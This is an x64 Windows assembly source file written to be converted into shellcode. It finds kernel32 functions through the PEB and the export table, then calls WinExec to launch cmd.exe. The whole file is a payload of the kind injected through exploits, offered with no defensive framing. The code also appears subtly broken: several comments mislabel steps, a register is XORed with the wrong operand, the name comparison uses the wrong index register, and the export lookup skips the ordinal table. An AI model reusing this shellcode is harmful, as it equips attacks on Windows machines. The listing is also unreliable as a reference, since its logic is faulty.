; windows_caller64bits_winexec.asm
; to convert to shellcode with HxD

.code
Start PROC
    SUB     rsp, 28h

    SUB     rsp, 24 ; rsp + 0  GetProcAddress
                    ; rsp + 8  LoadLibraryA
                    ; rsp + 16 WinExec

    JMP     _GetProcAddress

blob1:
    POP rdi                             ; "GetProcAddress" from the stack
    MOV     r15, 14 
    CALL    findFunction                ; find WinExec into rax
    MOV     qword ptr [rsp], rax
    JMP     _LoadLibraryA

blob2:
    POP     rdi                         ; "LoadLibraryA" from the stack
    MOV     r15, 12
    CALL    findFunction                 ; find WinExec into rax
    MOV     qword ptr [rsp+8], rax
    JMP     _Kernel32


blob3:
    POP     rcx                         ; "Kernel32.dll" from the stack
    MOV     rax, [rsp+8]                ; LoadLibraryA()
    SUB     rsp, 16
    CALL    rax
    ADD     rsp, 16
    JMP     _WinExec

blob4:
    POP     rdx                         ; "WinExec" from stack
    MOV     rcx, rax                    ; Kernel32.dll address
    MOV     rax, [rsp]                  ; GetProcAddress()
    SUB     rsp, 24
    CALL    rax
    ADD     rsp, 24
    MOV     qword ptr [rsp+16], rax
    JMP     _cmd

blob5:
    POP     rcx
    MOV     rdx, 1                      ; SW_NORMAL
    MOV     rax, [rsp+16]               ; WinExec()
    SUB     rsp, 24
    CALL    rax
    ADD     rsp, 24

findFunction:
_findKernelBase:
    XOR     rcx, rax
    ADD     rax, 60h
    MOV     rax, gs:[rax]

    MOV     rax, [rax+18h]              ; _PEB_LDR_DATA
    MOV     rbx, [rax+30h]              ; InInitializationOrderModuleList
    MOV     rbx, [rbx]
    MOV     r10, [rbx+10h]              ; Kernelbase.dll
    ; MOV   pKernelBase, r10

_findExportDirectoryRVAKernelBase:
    ; MOV   r10, pKernelBase
    XOR     rbx, rbx
    MOV     ebx, dword ptr [r10+03Ch]   ; e_lfanew
    XOR     rdx, rdx
    MOV     edx, dword ptr [r10+rbx+88h]
    ADD     rdx, r10                    ; rdx RVA Export Directory + kernelbase.dll

_findAddressOfNames:
    XOR     r11, r11
    MOV     r11d, dword ptr [rdx+20h]   ; AddressOfNames
    ADD     r11, r10
    ; MOV   pAddressOfNames, r11

_findNumberOfNames:
    XOR     r12, r12
    MOV     r12d, dword ptr [rdx+18h]   ; NumberOfNames
    ; MOV   numberOfNames, r12

_findAddressOfFuncs:
    XOR     r13, r13
    MOV     r13d, dword ptr [rdx+1Ch]   ; AddressOfFunctions
    ; MOV   pAddressOfFuncs, r13

    ; MOV   r13, numberOfNames
    ; LEA   rdi, sGetProcAddress
    XOR     rcx, rcx

_findFunctionsName:
    MOV     rax, r11                    ; pAddressOfNames
    MOV     r14d, dword ptr [rax+rcx*4]
    ADD     r14, r10
    MOV     rsi, r14
    ; MOV   funcName, r14
    ; MOV   rsi, funcname

    PUSH    rcx                         ; save the counter
    XOR     rcx, rcx

_functionComparaison:
    MOV     al, [rsi+rcx]
    MOV     ah, [rdi+rdx]
    CMP     al, ah
    JNE     _endFunctionComparaison
    CMP     rcx, r15                    ; sizeof "GetProcAddress", sizeof "LoadLibraryA"
    JE      _functionFound

_nextFunctionComparaison:
    INC     rcx
    JMP     _functionComparaison

_endFunctionComparaison:
    POP     rcx                         ; restore the counter
    JNZ     _nextFindFunctionsName

_functionFound:
    ; if function name found
    POP     rcx                         ; restore the counter
    INC     rcx
    XOR     r14, r14
    MOV     rax, r13                    ; pAddressOfFuncs
    MOV     r14d, dword ptr [rax+rcx*4]
    ADD     r14, r10
    ; MOV   funcAddress, r14
    ; MOV   rax, funcAddress
    MOV     rax, r14
    JMP     _endFindFunctionsName

_nextFindFunctionsName:
    XOR     rax, rax
    CMP     rcx, r12
    JE      _endFindFunctionsName
    INC     rcx
    JMP     _findFunctionsName

_endFindFunctionsName:
    RET

_GetProcAddress:
    CALL    blob1
    DB      "GetProcAddress", 0

_LoadLibraryA:
    CALL    blob2
    DB      "LoadLibraryA", 0

_Kernel32:
    CALL    blob3
    DB      "Kernel32.dll", 0

_WinExec:
    CALL    blob4
    DB      "WinExec", 0

_cmd:
    CALL    blob5
    DB      "cmd.exe", 0

Start ENDP

END